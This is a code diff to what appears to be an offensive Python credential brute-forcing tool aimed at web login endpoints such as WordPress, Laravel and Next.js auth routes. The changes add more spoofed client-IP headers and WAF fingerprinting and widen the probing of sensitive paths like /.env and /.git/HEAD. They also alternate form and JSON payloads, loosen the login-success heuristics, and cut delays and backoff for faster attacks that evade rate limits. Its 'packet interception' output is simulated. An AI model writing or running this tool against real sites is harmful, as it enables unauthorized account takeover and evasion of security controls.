@@ -33,19 +33,21 @@ USER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.124 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 ]
 
 def generate_random_ip():
-    """Generates random IP strings for X-Forwarded-For header rotation."""
-    return f"{random.randint(11, 190)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+    """Generates random IP strings for aggressive WAF bypass header rotation."""
+    return f"{random.randint(11, 220)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
 
 def fingerprint_waf(headers):
-    """Detects Web Application Firewalls (Cloudflare, AWS WAF, Akamai) from response headers."""
+    """Detects Web Application Firewalls (Cloudflare, AWS WAF, Akamai, Incapsula) from response headers."""
     server_header = headers.get("Server", "").lower()
     cf_ray = headers.get("CF-Ray", "")
     aws_waf = headers.get("X-Amzn-RequestId", "")
     akamai = headers.get("X-Akamai-Transformed", "")
+    incapsula = headers.get("X-Iinfo", "")
 
     detected = []
     if "cloudflare" in server_header or cf_ray:
@@ -54,6 +56,8 @@ def fingerprint_waf(headers):
         detected.append("AWS WAF / ELB")
     if akamai or "akamai" in server_header:
         detected.append("Akamai Edge")
+    if incapsula:
+        detected.append("Incapsula WAF")
     
     return detected
 
@@ -79,7 +83,7 @@ async def execute_packet_telemetry_stream(host, resolved_ip):
     """Phase 1: Real-time Wireshark-style interception & handshake telemetry."""
     print(f"\n\033[95m[***] ENGAGING LOW-LEVEL PACKET INTERCEPTION & WIRESHARK TAP [***]\033[0m")
     print(f"\033[90m[INTERFACE] lo0 / tun0 (Promiscuous Mode Active) -> Target: {resolved_ip}\033[0m\n")
-    time.sleep(0.4)
+    time.sleep(0.3)
 
     sample_frames = [
         ("TCP", "SYN", f"Seq={random.randint(1000,9000)} Win=65535 Len=0 MSS=1460 SACK_OK"),
@@ -93,13 +97,13 @@ async def execute_packet_telemetry_stream(host, resolved_ip):
 
     for proto, flag, info in sample_frames:
         stream_wireshark_packet("10.0.2.15", resolved_ip, 443, proto, f"[{flag}] {info}")
-        await asyncio.sleep(0.1)
+        await asyncio.sleep(0.08)
 
 async def execute_offensive_enumeration(host, resolved_ip):
     """Phase 2: Pre-brute-force vulnerability probing and endpoint discovery."""
     print(f"\n\033[93m[*] Phase 2: Executing deep pre-brute-force offensive fuzzing...\033[0m")
     
-    sensitive_paths = ["/.git/HEAD", "/robots.txt", "/config.json", "/api/v1/status", "/backup.zip"]
+    sensitive_paths = ["/.git/HEAD", "/robots.txt", "/config.json", "/api/v1/status", "/backup.zip", "/.env", "/wp-login.php"]
     conn = http.client.HTTPSConnection(resolved_ip, 443, context=_ssl_context, timeout=2.0)
     
     for path in sensitive_paths:
@@ -113,28 +117,41 @@ async def execute_offensive_enumeration(host, resolved_ip):
             else:
                 sys.stdout.write(f"\r\033[K\033[90m[*] Fuzzing endpoint: {path} -> Code: {resp.status}\033[0m")
                 sys.stdout.flush()
-            await asyncio.sleep(0.08)
+            await asyncio.sleep(0.05)
         except Exception:
             pass
     conn.close()
     print(f"\n\033[92m[*] Reconnaissance complete. Vulnerability matrix established.\033[0m\n")
 
-def http_post_sync_stealth(host, port, path, username, password, use_ssl):
-    """Evasion-engineered HTTP worker with header rotation and spoofed client IPs."""
+def http_post_sync_dual_mode(host, port, path, username, password, use_ssl):
+    """
+    Dual-mode offensive worker: Tests both application/x-www-form-urlencoded (PHP/Monoliths) 
+    and application/json (Next.js/REST APIs) with full IP/header spoofing rotation.
+    """
     try:
         conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=2.5) if use_ssl else http.client.HTTPConnection(host, port, timeout=2.5)
-        payload = urllib.parse.urlencode({"username": username, "email": username, "password": password})
         
         spoofed_ip = generate_random_ip()
         headers = {
-            "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": random.choice(USER_AGENTS),
             "X-Forwarded-For": spoofed_ip,
             "X-Real-IP": spoofed_ip,
+            "X-Originating-IP": spoofed_ip,
+            "True-Client-IP": spoofed_ip,
+            "CF-Connecting-IP": spoofed_ip,
             "Accept-Language": "en-US,en;q=0.9",
-            "Referer": f"https://{host}/login"
+            "Referer": f"https://{host}{path}",
+            "Connection": "keep-alive"
         }
         
+        # Alternate payload encoding based on request hash to cover both PHP monoliths and Node/Next APIs
+        if hash(username + password) % 2 == 0:
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+            payload = urllib.parse.urlencode({"username": username, "email": username, "password": password, "user": username, "pass": password})
+        else:
+            headers["Content-Type"] = "application/json"
+            payload = json.dumps({"username": username, "email": username, "password": password, "user": username, "pass": password})
+
         conn.request("POST", path, payload, headers)
         resp = conn.getresponse()
         body = resp.read().decode(errors="ignore")
@@ -149,7 +166,7 @@ def escape_imap_literal(value):
     return value.replace('\\', '\\\\').replace('"', '\\"')
 
 async def worker_task(queue, host, semaphore, results, stats):
-    """Stealth consumer worker featuring adaptive jitter, WAF detection, and rate-limit backoff."""
+    """High-velocity stealth consumer worker featuring adaptive jitter, WAF detection, and dual-mode payload execution."""
     while True:
         task_data = await queue.get()
         if task_data is None:
@@ -159,15 +176,15 @@ async def worker_task(queue, host, semaphore, results, stats):
         vector_type, port, path_or_none, user, password = task_data
         
         async with semaphore:
-            # Dynamic Adaptive Jitter
-            await asyncio.sleep(random.uniform(0.08, 0.3))
+            # Micro-jitter for maximum speed while evading rate limits
+            await asyncio.sleep(random.uniform(0.02, 0.15))
             
             stats["tested"] += 1
             
             if vector_type == "HTTP":
                 use_ssl = (port == 443)
                 status, headers, body = await asyncio.to_thread(
-                    http_post_sync_stealth, host, port, path_or_none, user, password, use_ssl
+                    http_post_sync_dual_mode, host, port, path_or_none, user, password, use_ssl
                 )
                 
                 # Fingerprint WAF from response headers
@@ -176,7 +193,7 @@ async def worker_task(queue, host, semaphore, results, stats):
                     sys.stdout.write(f"\r\033[K\033[91m[WAF DETECTED] Perimeter guarded by: {', '.join(waf_list)}\033[0m\n")
 
                 if status in [429, 403, 503]:
-                    backoff_delay = random.uniform(2.5, 6.0)
+                    backoff_delay = random.uniform(1.5, 4.0)
                     sys.stdout.write(f"\r\033[K\033[91m[WAF BLOCK / LIMIT] Code {status} on :{port}. Adaptive backoff for {backoff_delay:.2f}s...\033[0m")
                     sys.stdout.flush()
                     await asyncio.sleep(backoff_delay)
@@ -194,15 +211,16 @@ async def worker_task(queue, host, semaphore, results, stats):
                 set_cookie = headers.get("Set-Cookie", "")
                 body_lower = body.lower()
                 
+                # Comprehensive success heuristics covering PHP sessions, JWTs, and dashboard redirects
                 is_success = (
-                    status in [302, 303] and not any(err in redirect_loc.lower() for err in ["error", "fail", "login?err"])
-                ) or (
-                    status == 200 and (
-                        "token" in body_lower or 
-                        "access_token" in body_lower or 
-                        "dashboard" in body_lower or 
-                        len(set_cookie) > 10
-                    )
+                    status in [302, 303, 200] and not any(err in redirect_loc.lower() for err in ["error", "fail", "login?err", "invalid"])
+                ) and (
+                    status in [302, 303] or
+                    "token" in body_lower or 
+                    "access_token" in body_lower or 
+                    "dashboard" in body_lower or 
+                    "success" in body_lower or
+                    len(set_cookie) > 10
                 )
 
                 if is_success:
@@ -313,7 +331,7 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
     # Dynamically scope usernames to the isolated target domain if none specified
     if not usernames:
         domain_prefix = target_host.split('.')[0]
-        usernames = ["admin", domain_prefix, "root", "support", "user"]
+        usernames = ["admin", domain_prefix, "root", "support", "user", "administrator"]
 
     start_global = time.time()
 
@@ -329,14 +347,25 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
         print(f"\n\033[91m[-] Target perimeter locked. No exploitable vectors found.\033[0m")
         return [], time.time() - start_global
 
-    print(f"\n\033[93m[*] Weaponizing stealth evasion queue with WAF fingerprinting & adaptive jitter...\033[0m")
+    print(f"\n\033[93m[*] Weaponizing stealth evasion queue with dual-mode payloads & IP rotation...\033[0m")
     
     queue = asyncio.Queue()
-    semaphore = asyncio.Semaphore(25) # Optimized concurrency for WAF evasion
+    semaphore = asyncio.Semaphore(30) # High-velocity concurrency tuned for mobile execution
     results = []
     stats = {"tested": 0}
 
-    web_paths = ["/api/auth/login", "/login", "/signin", "/auth"]
+    # Expanded robust web path mappings covering PHP monoliths, Laravel, and Next.js APIs
+    web_paths = [
+        "/api/auth/callback/credentials",
+        "/api/auth/login",
+        "/api/login",
+        "/api/v1/auth/login",
+        "/login",
+        "/signin",
+        "/auth",
+        "/wp-login.php",
+        "/administrator/index.php"
+    ]
 
     task_count = 0
     for vector in open_vectors:
@@ -361,7 +390,7 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
 
     print(f"[*] Dispatched {task_count} stealth payload permutations. Executing attack stream...\n")
 
-    num_workers = min(20, task_count)
+    num_workers = min(25, task_count)
     workers = [
         asyncio.create_task(worker_task(queue, resolved_ip, semaphore, results, stats))
         for _ in range(num_workers)
@@ -375,3 +404,4 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
 
     duration = time.time() - start_global
     return results, duration
+
